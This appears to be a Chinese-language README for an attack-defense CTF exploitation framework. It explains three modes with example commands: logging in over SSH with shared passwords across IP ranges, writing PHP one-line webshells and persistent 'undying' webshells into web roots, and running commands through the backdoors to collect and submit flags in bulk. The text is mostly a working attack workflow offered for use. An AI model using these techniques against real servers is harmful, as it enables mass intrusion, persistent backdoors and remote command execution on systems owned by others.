这个frame暂时只写了三个攻击模块。

这里没写打payload的模块，感觉这个模块的可控性比较低，可以自己写了调用command.py中的sendflag方法。

##### 场景一： 如果有相同的ssh密码的话可以直接利用ssh模块快速登录执行命令，使用默认命令的话会写入到/var/www/html/目录md5的一句话，接着利用一句话上传不死马，会接着访问，然后会询问是否接着执行getflag的命令接着批量提交flag，提交flag的话需要设置send.txt文件，抓一下提交flag的包复制进去，将flag位置设置为{flag}，cookie等不需要再设置。
```
python exp.py --mode ssh --ip 192.168.190.1-200
```
##### 场景二： 已经有了一句话，可以接着执行命令中不死马，然后批量提交flag。

注意这个paawd的密码默认md5的话是cmd而不是p0desta.top，跟其他的一句话一样。
```
python exp.py --mode upload --ip 192.168.190.128 --path "/.config.php" --passwd "cmd" --localshell "p0desta.top.php"
```

##### 场景三： 后门已经中好，直接利用一句话来提交flag。

```
python exp.py --mode submit --ip 192.168.190.1-200 --path "/.config.php" --passwd "cmd" --command "system('cat flag');"
```

另外这里访问md5马的时候会随机打出若干混淆密码，都是32位的md5值。
```
987aed24dbac1610cd95edb012fcdf35    -md5->  9b114784e0951159b37d5afacac7199c
```